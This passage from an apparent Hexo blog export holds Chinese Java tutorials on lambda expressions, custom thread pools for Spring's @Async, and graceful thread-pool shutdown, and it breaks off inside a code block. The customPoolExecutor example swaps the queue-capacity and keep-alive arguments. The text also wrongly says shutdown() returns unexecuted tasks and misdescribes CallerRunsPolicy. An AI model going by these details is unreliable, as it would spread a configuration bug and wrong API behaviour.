y)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义外部方法调用接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFunc</span><span class="hljs-params">(Operator operator)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> operator.add(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>);<br>    System.out.println(sum);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用外部方法，以lambda表达式替代传入的接口对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//一般写法</span><br>add((x, y) -&gt; &#123;<br>    <span class="hljs-keyword">return</span> x + y;<br>&#125;);<br><span class="hljs-comment">//省略return和&#123;&#125;</span><br>addFunc((x, y) -&gt; x+y);<br><span class="hljs-comment">//一个参数可省略()，一行方法可省略&#123;&#125;和;</span><br>print(s -&gt; System.out.println(s))  <br></code></pre></td></tr></table></figure><h3 id="Lambda表达式的注意事项"><a href="#Lambda表达式的注意事项" class="headerlink" title="Lambda表达式的注意事项"></a>Lambda表达式的注意事项</h3><ol><li><p>使用Lambda必须要有接口，并且要求接口中<strong>有且仅有一个</strong>抽象的方法</p></li><li><p>必须有<strong>上下文环境</strong>，才能推导出Lambda对应的接口</p></li></ol><ul><li>根据局部变量的赋值得知Lambda对应的接口：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>() -&gt;System.out.println(“Lambda表达式”);<br></code></pre></td></tr></table></figure><ul><li>根据调用方法的参数得知Lambda对应的接口：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;System.out.println(“Lambda表达式”)).start();<br></code></pre></td></tr></table></figure><h2 id="3-Lambda表达式和匿名内部类的区别"><a href="#3-Lambda表达式和匿名内部类的区别" class="headerlink" title="3. Lambda表达式和匿名内部类的区别"></a>3. Lambda表达式和匿名内部类的区别</h2><h3 id="所需类型不同"><a href="#所需类型不同" class="headerlink" title="所需类型不同"></a>所需类型不同</h3><ul><li>匿名内部类：可以是接口，也可以是抽象类，还可以是具体类</li><li>Lambda表达式：只能是接口</li></ul><h3 id="使用限制不同"><a href="#使用限制不同" class="headerlink" title="使用限制不同"></a>使用限制不同</h3><ul><li><p>如果接口中有且仅有一个抽象方法，可以使用Lambda表达式，也可以使用匿名内部类</p></li><li><p>如果接口中多于一个抽象方法，只能使用匿名内部类，而不能使用Lambda表达式</p></li></ul><h3 id="实现原理不同"><a href="#实现原理不同" class="headerlink" title="实现原理不同"></a>实现原理不同</h3><ul><li>匿名内部类：编译之后，产生一个单独的.class字节码文件</li><li>Lambda表达式：编译之后，没有一个单独的.class字节码文件，对应的字节码会在运行的时候动态生成</li></ul><blockquote><p>参考文章： <a href="https://blog.csdn.net/hua226/article/details/124409889?ops_request_misc=%7B%22request_id%22:%22165742542816780366560942%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165742542816780366560942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124409889-null-null.142%5Ev32%5Epc_rank_34,185%5Ev2%5Econtrol&utm_term=%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B&spm=1018.2226.3001.4187">Java 函数式编程</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异步调用（三）@Async自定义线程池</title>
    <link href="/2022/07/10/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%89)/"/>
    <url>/2022/07/10/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h1 id="一、为什么要给-Async-自定义线程池"><a href="#一、为什么要给-Async-自定义线程池" class="headerlink" title="一、为什么要给 @Async 自定义线程池"></a>一、为什么要给 @Async 自定义线程池</h1><p> 使用<code>@Async</code>注解，在默认情况下用的是 <strong>SimpleAsyncTaskExecutor 线程池，该线程池不是真正意义上的线程池</strong>。使用此线程池无法实现线程重用，每次调用都会新建一条线程。若系统中不断的创建线程，最终会导致系统占用内存过高，引发<code>OOM</code>。 因此我们需要自定义线程池来保证线程池可控。</p><h1 id="二、-Async-如何自定义线程池"><a href="#二、-Async-如何自定义线程池" class="headerlink" title="二、@Async 如何自定义线程池"></a>二、@Async 如何自定义线程池</h1><h2 id="1-配置默认线程池"><a href="#1-配置默认线程池" class="headerlink" title="1. 配置默认线程池"></a>1. 配置默认线程池</h2><p>创建配置类实现 <code>AsyncConfigurer</code> ，重写 以下两个方法来指定默认线程池：</p><ul><li><code>getAsyncUncaughtExceptionHandler()</code> </li><li><code>getAsyncExecutor()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableAsync</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncExecutorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AsyncConfigurer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(AsyncExecutorConfig.class);<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">getAsyncExecutor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">taskExecutor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();<br>        <span class="hljs-comment">//核心线程数</span><br>        taskExecutor.setCorePoolSize(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//线程池维护线程的最大数量,只有在缓冲队列满了之后才会申请超过核心线程数的线程</span><br>        taskExecutor.setMaxPoolSize(<span class="hljs-number">10</span>);<br>        <span class="hljs-comment">//缓存队列</span><br>        taskExecutor.setQueueCapacity(<span class="hljs-number">50</span>);<br>        <span class="hljs-comment">//许的空闲时间,当超过了核心线程出之外的线程在空闲时间到达之后会被销毁</span><br>        taskExecutor.setKeepAliveSeconds(<span class="hljs-number">200</span>);<br>        <span class="hljs-comment">//异步方法内部线程名称</span><br>        taskExecutor.setThreadNamePrefix(<span class="hljs-string">&quot;async-pool-&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略</span><br><span class="hljs-comment">         * 通常有以下四种策略：</span><br><span class="hljs-comment">         * ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。</span><br><span class="hljs-comment">         * ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。</span><br><span class="hljs-comment">         * ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）</span><br><span class="hljs-comment">         * ThreadPoolExecutor.CallerRunsPolicy：重试添加当前的任务，自动重复调用 execute() 方法，直到成功</span><br><span class="hljs-comment">         */</span><br>        taskExecutor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());<br>        taskExecutor.initialize();<br><br>        <span class="hljs-keyword">return</span> taskExecutor;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> AsyncUncaughtExceptionHandler <span class="hljs-title function_">getAsyncUncaughtExceptionHandler</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (ex, method, params) -&gt;<br>                LOGGER.error(<span class="hljs-string">&quot;线程池执行任务发生错误，执行方法&#123;&#125;&quot;</span>,method.getName(),ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-为-Async-指定线程池"><a href="#2-为-Async-指定线程池" class="headerlink" title="2. 为 @Async 指定线程池"></a>2. 为 @Async 指定线程池</h2><p>修改以上配置类，添加自定义线程池 <code>customPoolExecutor</code> ，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableAsync</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;spring.executor.pool&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncExecutorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AsyncConfigurer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(AsyncExecutorConfig.class);<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">CORE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">KEEP_ALIVE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">QUEUE_CAPACITY</span> <span class="hljs-operator">=</span> <span class="hljs-number">50</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">THREAD_NAME_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;custom-pool-&quot;</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自定义线程池</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean(&quot;customPoolExecutor&quot;)</span><br>    <span class="hljs-keyword">public</span> ThreadPoolTaskExecutor <span class="hljs-title function_">customPoolExecutor</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">taskExecutor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();<br>        <span class="hljs-comment">//核心线程数</span><br>        taskExecutor.setCorePoolSize(CORE_SIZE);<br>        <span class="hljs-comment">//线程池维护线程的最大数量,只有在缓冲队列满了之后才会申请超过核心线程数的线程</span><br>        taskExecutor.setMaxPoolSize(MAX_SIZE);<br>        <span class="hljs-comment">//缓存队列</span><br>        taskExecutor.setQueueCapacity(KEEP_ALIVE);<br>        <span class="hljs-comment">//空闲时间,当超过了核心线程出之外的线程在空闲时间到达之后会被销毁</span><br>        taskExecutor.setKeepAliveSeconds(QUEUE_CAPACITY);<br>        <span class="hljs-comment">//异步方法内部线程名称</span><br>        taskExecutor.setThreadNamePrefix(THREAD_NAME_PREFIX);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任y务拒绝策略</span><br><span class="hljs-comment">         * 通常有以下四种策略：</span><br><span class="hljs-comment">         * ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。</span><br><span class="hljs-comment">         * ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。</span><br><span class="hljs-comment">         * ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）</span><br><span class="hljs-comment">         * ThreadPoolExecutor.CallerRunsPolicy：重试添加当前的任务，自动重复调用 execute() 方法，直到成功</span><br><span class="hljs-comment">         */</span><br>        taskExecutor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());<br>        taskExecutor.initialize();<br><br>        <span class="hljs-keyword">return</span> taskExecutor;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 默认线程池</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> ThreadPoolTaskExecutor <span class="hljs-title function_">asyncPoolExecutor</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">taskExecutor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();<br>        <span class="hljs-comment">//核心线程数</span><br>        taskExecutor.setCorePoolSize(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//线程池维护线程的最大数量,只有在缓冲队列满了之后才会申请超过核心线程数的线程</span><br>        taskExecutor.setMaxPoolSize(<span class="hljs-number">10</span>);<br>        <span class="hljs-comment">//缓存队列</span><br>        taskExecutor.setQueueCapacity(<span class="hljs-number">50</span>);<br>        <span class="hljs-comment">//许的空闲时间,当超过了核心线程出之外的线程在空闲时间到达之后会被销毁</span><br>        taskExecutor.setKeepAliveSeconds(<span class="hljs-number">200</span>);<br>        <span class="hljs-comment">//异步方法内部线程名称</span><br>        taskExecutor.setThreadNamePrefix(<span class="hljs-string">&quot;async-pool-&quot;</span>);<br>        <span class="hljs-comment">//线程池的拒绝策略</span><br>        taskExecutor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());<br>        taskExecutor.initialize();<br><br>        <span class="hljs-keyword">return</span> taskExecutor;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">getAsyncExecutor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> asyncPoolExecutor();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> AsyncUncaughtExceptionHandler <span class="hljs-title function_">getAsyncUncaughtExceptionHandler</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (ex, method, params) -&gt;<br>                LOGGER.error(<span class="hljs-string">&quot;线程池执行任务发生错误，执行方法&#123;&#125;&quot;</span>,method.getName(),ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>线程池参数通过配置文件维护（这里使用了 <code>@ConfigurationProperties</code> 搭配 <code>@Data</code> 简化配置，用法可参考  <a href="https://blog.csdn.net/yusimiao/article/details/97622666">@Configurationproperties注解使用姿势</a> ；当然你也可以使用 <code>@Value</code> ），</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#线程池参数</span><br><span class="hljs-attr">spring.executor.pool.core-size</span>=<span class="hljs-string">3</span><br><span class="hljs-attr">spring.executor.pool.max-size</span>=<span class="hljs-string">10</span><br><span class="hljs-attr">spring.executor.pool.keep-alive</span>=<span class="hljs-string">60</span><br><span class="hljs-attr">spring.executor.pool.queue-capacity</span>=<span class="hljs-string">50</span><br><span class="hljs-attr">spring.executor.pool.thread-name-prefix</span>=<span class="hljs-string">custom-pool-</span><br></code></pre></td></tr></table></figure><p>在注解指定线程池，<code>doTask1()</code> 使用默认线程池，<code>doTask2()</code> 使用自定义线程池，用法非常灵活，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Async</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doTask1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    Thread.sleep(<span class="hljs-number">1000</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    LOGGER.info(<span class="hljs-string">&quot;task1 cost &#123;&#125; ms&quot;</span> , t2-t1);<br>&#125;<br><br><span class="hljs-meta">@Async(&quot;customPoolExecutor&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doTask2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    Thread.sleep(<span class="hljs-number">1000</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    LOGGER.info(<span class="hljs-string">&quot;task2 cost &#123;&#125; ms&quot;</span> , t2-t1);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>controller</code> 中调用方法进行测试，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/learn/async&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">async</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        System.out.println(<span class="hljs-string">&quot;主方法执行...&quot;</span>);<br><br>        asyncTask.doTask1();<br>        asyncTask.doTask2();<br><br>        System.out.println(<span class="hljs-string">&quot;主方法执行完毕...&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>执行情况如下，可以看出两个方法使用不同线程池进行异步方法执行。</p><p><img src="/../blog-assets/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%89)/1657278380302.png" alt="1657278380302"></p><blockquote><p>需要注意的是，一定要在外部的类中去调用这个方法，如果在本类调用则不会异步执行，比如 <code>this.doTask1() </code> ；当然一定要在Spring容器环境中，手动 new 一个类调用方法也不会生效</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>多线程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异步调用（二）线程池的优雅关闭</title>
    <link href="/2022/07/08/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%BA%8C)/"/>
    <url>/2022/07/08/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h1 id="一、线程中断"><a href="#一、线程中断" class="headerlink" title="一、线程中断"></a>一、线程中断</h1><p>在介绍线程池关闭之前，先介绍下Thread的interrupt。</p><p>在程序中，我们是不能随便中断一个线程的，因为这是极其不安全的操作，我们无法知道这个线程正运行在什么状态，它可能持有某把锁，强行中断可能导致锁不能释放的问题；或者线程可能在操作数据库，强行中断导致数据不一致混乱的问题。正因此，Java里将 <code>Thread</code> 的 <code>stop()</code> 方法设置为过时，以禁止大家使用。</p><p>那么一个线程什么时候可以退出呢？当然只有线程自己才能知道。</p><p>所以我们这里要说的 <code>Thread</code> 的 <code>interrupt()</code> 方法，本质不是用来中断一个线程。是将线程设置一个中断状态。当我们调用线程的interrupt方法，它有两个作用：</p><ul><li><p>如果此线程处于阻塞状态(比如调用了<code>wait()</code> 方法，io等待)，则会立马退出阻塞，并抛出<code>InterruptedException</code> 异常，线程就可以通过捕获 <code>InterruptedException</code> 异常来做一定的处理，然后让线程退出。</p></li><li><p>如果此线程正处于运行之中，则线程不受任何影响，继续运行，仅仅是线程的中断标记被设置为true。所以线程要在适当的位置通过调用 <code>isInterrupted()</code> 方法来查看自己是否被中断，并做退出操作。</p></li></ul><blockquote><p><strong>注：</strong></p><ol><li><p>如果线程的interrupt方法先被调用，然后线程调用阻塞方法进入阻塞状态，<code>InterruptedException</code> 异常依旧会抛出。</p></li><li><p>如果线程捕获 <code>InterruptedException</code> 异常后，继续调用阻塞方法，将不再触发异常。</p></li></ol></blockquote><h1 id="二、线程池的关闭方法"><a href="#二、线程池的关闭方法" class="headerlink" title="二、线程池的关闭方法"></a>二、线程池的关闭方法</h1><p>线程池提供了两个关闭方法：</p><h2 id="1-shutdown"><a href="#1-shutdown" class="headerlink" title="1. shutdown()"></a>1. shutdown()</h2><p><strong>停止接收新任务，原来的任务继续执行</strong>：</p><ol><li>停止接收新的submit的任务；</li><li>已经提交的任务（包括正在跑的和队列中等待的）,会继续执行完成；</li><li>等到第2步完成后，才真正停止；</li><li>返回未执行的任务列表；</li></ol><h2 id="2-shutdownNow"><a href="#2-shutdownNow" class="headerlink" title="2. shutdownNow()"></a>2. shutdownNow()</h2><p><strong>停止接收新任务，原来的任务停止执行</strong>：</p><ol><li>同 shutdown() 方法 ，先停止接收新submit的任务；</li><li>忽略队列里等待的任务；</li><li>尝试将正在执行的任务interrupt中断；</li><li>返回未执行的任务列表；</li></ol><blockquote><p>说明：它试图终止线程的方法是通过调用 <code>Thread.interrupt()</code> 方法来实现的，这种方法的作用有限，如果线程中没有<code>sleep</code> 、<code>wait</code>、<code>Condition</code>、定时锁等应用, <code>interrupt()</code> 方法是无法中断当前的线程的。所以，<code>shutdownNow() </code>并不代表线程池就一定立即就能退出，它也可能必须要等待所有正在执行的任务都执行完成了才能退出。但是大多数时候是能立即退出的。</p></blockquote><h2 id="3-awaitTermination-long-timeOut-TimeUnit-unit"><a href="#3-awaitTermination-long-timeOut-TimeUnit-unit" class="headerlink" title="3. awaitTermination(long timeOut, TimeUnit unit)"></a>3. awaitTermination(long timeOut, TimeUnit unit)</h2><p>当前线程阻塞，timeout 和 TimeUnit 两个参数，用于设定超时的时间及单位，当前线程阻塞，直到：</p><ul><li>等所有已提交的任务（包括正在跑的和队列中等待的）执行完；</li><li>或者 等超时时间到了（ <code>timeout</code>  和 <code>TimeUnit</code> 设定的时间）；</li><li>或者 线程被中断，抛出 <code>InterruptedException</code> 异常</li></ul><p>然后会监测 ExecutorService 是否已经关闭，返回 <code>true</code>（shutdown请求后所有任务执行完毕）或 <code>false</code>（已超时）</p><h2 id="4-三种方法的区别"><a href="#4-三种方法的区别" class="headerlink" title="4. 三种方法的区别"></a>4. 三种方法的区别</h2><h3 id="shutdown-与-shutdownNow"><a href="#shutdown-与-shutdownNow" class="headerlink" title="shutdown() 与 shutdownNow()"></a>shutdown() 与 shutdownNow()</h3><ul><li><code>shutdown()</code> 只是关闭了提交通道，用 <code>submit()</code> 是无效的；而内部该怎么跑还是怎么跑，跑完再停。</li><li><code>shutdownNow()</code> 能立即停止线程池，正在跑的和正在等待的任务都停下了。</li></ul><h3 id="shutdown-与-awaitTermination"><a href="#shutdown-与-awaitTermination" class="headerlink" title="shutdown() 与 awaitTermination()"></a>shutdown() 与 awaitTermination()</h3><ul><li><code>shutdown()</code> 后，不能再提交新的任务进去；但是 <code>awaitTermination()</code> 后，可以继续提交。</li><li><code>awaitTermination()</code> 是阻塞的，返回结果是线程池是否已停止（true&#x2F;false）；<code>shutdown()</code> 不阻塞。</li></ul><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><ul><li><strong>优雅的关闭</strong>，用 <code>shutdown()</code></li><li><strong>立马关闭</strong>，并得到未执行任务列表，用 <code>shutdownNow()</code></li><li>优雅的关闭，并允许关闭声明后新任务能提交，用 <code>awaitTermination()</code></li><li>关闭功能 【从强到弱】 依次是：<code>shuntdownNow()</code>  &gt;  <code>shutdown()</code>  &gt;  <code>awaitTermination()</code></li></ul><h1 id="三、如何实现线程池的优雅关闭"><a href="#三、如何实现线程池的优雅关闭" class="headerlink" title="三、如何实现线程池的优雅关闭"></a>三、如何实现线程池的优雅关闭</h1><h2 id="addShutdownHook-原理"><a href="#addShutdownHook-原理" class="headerlink" title="addShutdownHook 原理"></a>addShutdownHook 原理</h2><p><code>RunTime.getRunTime().addShutdownHook()</code> 的作用就是在 <code>JVM</code> 销毁前执行的最后一个线程，通过<code>addShutdownHook</code> 添加钩子，当系统执行完这些钩子后，<code>JVM</code> 才会关闭，因此我们可以在这个线程中把我们前面使用 <code>ExecutorService</code> 创建的线程池优雅地关闭掉。</p><h2 id="addShutdownHook-优雅关闭线程池"><a href="#addShutdownHook-优雅关闭线程池" class="headerlink" title="addShutdownHook 优雅关闭线程池"></a>addShutdownHook 优雅关闭线程池</h2><p>在以下示例中，手动关闭 <code>JVM</code> 后，会触发线程池的优雅关闭：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 